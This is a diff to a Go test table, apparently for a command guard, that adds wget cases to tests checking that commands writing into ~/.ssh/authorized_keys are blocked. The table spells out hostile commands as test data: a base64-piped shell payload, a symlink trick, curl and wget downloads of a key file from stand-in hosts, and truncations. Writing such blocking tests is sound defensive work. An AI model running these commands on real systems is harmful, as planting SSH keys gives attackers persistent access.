@@ -253,6 +253,8 @@ func TestHomeSpelledAuthorizedKeysWriteBlocks(t *testing.T) {
 		{"decoded shell", `echo ZWNobyAic3NoLWVkMjU1MTkgQUFBQXVjY21hcmtlciB1Y2NAdGVzdCIgPj4gfi8uc3NoL2F1dGhvcml6ZWRfa2V5cw== | base64 -d | sh`, "", "", true},
 		{"symlink write", `ln -sf ~/.ssh/authorized_keys ./keys.link && echo dccert-block-marker >> ./keys.link`, "", "", true},
 		{"curl output", `curl -s -o ~/.ssh/authorized_keys http://127.0.0.1:9/marker.pub; echo rc=$?`, "", "", true},
+		{"wget output", `wget -O ~/.ssh/authorized_keys https://example.com/marker.pub`, "", "", true},
+		{"wget compact output", `wget -qO ~/.ssh/authorized_keys https://example.com/marker.pub`, "", "", true},
 		{"no-op truncate", `: > ~/.ssh/authorized_keys`, "", "", true},
 		{"bare truncate", `> ~/.ssh/authorized_keys`, "", "", true},
 		{"windows command", `powershell -NoProfile -Command Add-Content -Path C:\Users\alice\.ssh\authorized_keys -Value dccert-block-marker`, `C:/Users/alice/project`, `C:/Users/alice`, true},
